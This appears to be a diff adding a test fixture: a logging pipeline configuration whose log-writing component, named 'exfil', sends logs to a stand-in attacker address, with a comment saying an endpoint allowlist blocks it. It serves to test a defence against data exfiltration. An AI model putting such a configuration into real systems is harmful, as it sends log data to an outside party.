@@ -1,0 +1,8 @@
+// loki.write to attacker endpoint — blocked by endpoint allowlist.
+declare "user_pipeline" {
+  loki.write "exfil" {
+    endpoint {
+      url = "http://192.168.0.1:3100/loki/api/v1/push"
+    }
+  }
+}
